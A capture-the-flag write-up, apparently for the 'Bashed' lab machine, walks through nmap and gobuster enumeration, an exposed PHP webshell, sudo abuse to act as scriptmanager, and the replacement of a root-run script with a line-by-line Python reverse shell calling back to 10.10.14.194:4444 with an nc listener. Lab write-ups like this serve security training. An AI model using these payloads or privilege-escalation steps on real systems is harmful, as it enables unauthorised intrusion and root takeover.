BASHED

Started with a standard nmap scan:

sudo nmap -sV 10.129.80.3
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Browsing to the web server reveals nothing interesting; let's try fuzzing:

gobuster dir -u http://10.129.80.3/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50

We find a dev directory that leads to a PHP webshell as www-data at:

http://10.129.80.3/dev/phpbash.php

We find user.txt in /home/arrexel.

Checking sudo permissions as www-data reveals something interesting:

sudo -l
(scriptmanager : scriptmanager) NOPASSWD: ALL

We can execute commands as scriptmanager. We can test it with the command:

sudo -u scriptmanager whoami

The output shows us that we can execute commands as scriptmanager.

Browsing through the scripts, we find an interesting script called test.py.

Let's find out with what permissions the script runs by creating a temporary file that executes the command whoami:

echo 'import os; open("/scripts/who.txt","w").write(os.popen("whoami").read())' > /tmp/test.py

After waiting a couple of minutes, we can verify:

cat /scripts/who.txt
root

The script runs as root! We can overwrite it by replacing it with a reverse shell script that points to our VM.

Let's set up a listener:

nc -lvnp 4444

Then, let's write a simple reverse shell command; since passing the whole command at once was causing problems and bugging the webshell, we insert it line by line manually:

echo 'import socket,subprocess,os' > /tmp/shell.py
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)' >> /tmp/shell.py
echo 's.connect(("10.10.14.194",4444))' >> /tmp/shell.py
echo 'os.dup2(s.fileno(),0)' >> /tmp/shell.py
echo 'os.dup2(s.fileno(),1)' >> /tmp/shell.py
echo 'os.dup2(s.fileno(),2)' >> /tmp/shell.py
echo 'subprocess.call(["/bin/sh","-i"])' >> /tmp/shell.py

Let's copy it with:

sudo -u scriptmanager cp /tmp/shell.py /scripts/test.py

We receive a shell as root in our listener; root.txt is in root's directory.
